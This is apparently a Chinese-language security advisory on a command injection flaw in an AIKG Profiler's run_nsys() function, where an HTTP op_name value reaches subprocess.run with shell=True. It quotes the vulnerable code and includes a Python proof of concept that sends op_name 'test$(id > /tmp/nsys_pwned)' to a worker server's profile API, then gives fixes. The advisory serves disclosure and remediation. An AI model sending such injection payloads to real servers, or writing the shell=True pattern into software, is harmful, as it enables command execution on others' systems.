# SA-005: Command Injection via shell=True in nsys Execution

## 漏洞概述

**漏洞类型**: 命令注入 (Command Injection)  
**CWE**: CWE-78 (OS Command Injection)  
**严重性**: Critical  
**置信度**: 85/100

与 SA-004 相同的漏洞模式，但触发点为 `run_nsys()` 函数。AIKG Profiler 使用 `subprocess.run()` 配合 `shell=True` 执行 nsys profile 命令，命令字符串通过 f-string 直接拼接参数，允许 shell 元字符注入。

---

## 源码分析

### 漏洞代码: profiler_utils.py (第224-226行)

```python
def run_nsys(script_path: str, op_name: str = "", task_id: str = "0") -> Tuple[bool, str, Optional[str]]:
    """运行nsys性能分析"""
    try:
        output_name = "nsys_report_" + os.path.basename(script_path).replace(".py", "")
        cmd = f'nsys profile --output={output_name} python {script_path}'  # ← 命令注入点
        logger.debug(f"[{task_id}:{op_name}] Running nsys profile: {cmd}")
        process = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=600)  # ← shell=True
```

**关键问题**:
1. `shell=True` 启用 shell 解释器
2. `script_path` 和 `output_name` 直接嵌入 shell 命令
3. `output_name` 由 `script_path` 派生，间接受 `op_name` 控制

### 数据流

```
HTTP POST op_name → script_name = "profile_{op_name}_*.py" → script_path → output_name → cmd → subprocess.run(shell=True)
```

## 概念验证 (PoC)

import requests
import tarfile
import io

def create_profile_tar():
    """创建 profile tar 包"""
    tar_buffer = io.BytesIO()
    with tarfile.open(fileobj=tar_buffer, mode='w') as tar:
        # CUDA profile 需要 base 和 generation 脚本
        for suffix in ['base', 'generation']:
            script = f"print('profile {suffix}')"
            script_bytes = script.encode('utf-8')
            tarinfo = tarfile.TarInfo(name=f"profile_test{suffix}.py")
            tarinfo.size = len(script_bytes)
            tar.addfile(tarinfo, io.BytesIO(script_bytes))
    return tar_buffer.getvalue()

def exploit_cmd_injection_nsys(target_url="http://worker-server:9001"):
    """通过 op_name 注入命令到 nsys 执行"""
    tar_data = create_profile_tar()
    
    # Payload: 使用 $() 子 shell 注入
    malicious_op_name = "test$(id > /tmp/nsys_pwned)"
    
    response = requests.post(
        f"{target_url}/api/v1/profile",
        files={"package": ("profile.tar", tar_data)},
        data={
            "task_id": "nsys-inject-001",
            "op_name": malicious_op_name,
            "profile_settings": '{"backend": "cuda"}'  # 触发 nsys
        }
    )
    
    print(f"Response: {response.status_code}")

exploit_cmd_injection_nsys()

## 修复建议

### 1. 移除 shell=True

```python
def run_nsys(script_path: str, op_name: str = "", task_id: str = "0") -> Tuple[bool, str, Optional[str]]:
    """运行nsys性能分析 - 安全版本"""
    try:
        # 使用安全的 output_name 生成
        output_name = "nsys_report_" + re.sub(r'[^\w]', '_', os.path.basename(script_path).replace(".py", ""))
        
        # 使用列表参数
        process = subprocess.run(
            ['nsys', 'profile', f'--output={output_name}', 'python', script_path],
            shell=False,
            capture_output=True, text=True, timeout=600
        )
```

### 2. 统一修复方案

建议创建安全的 subprocess 执行工具：

```python
def safe_subprocess_run(command_list: list, **kwargs) -> subprocess.CompletedProcess:
    """安全的 subprocess 执行，强制禁用 shell"""
    if 'shell' in kwargs:
        kwargs['shell'] = False  # 强制禁用
    return subprocess.run(command_list, **kwargs)
```
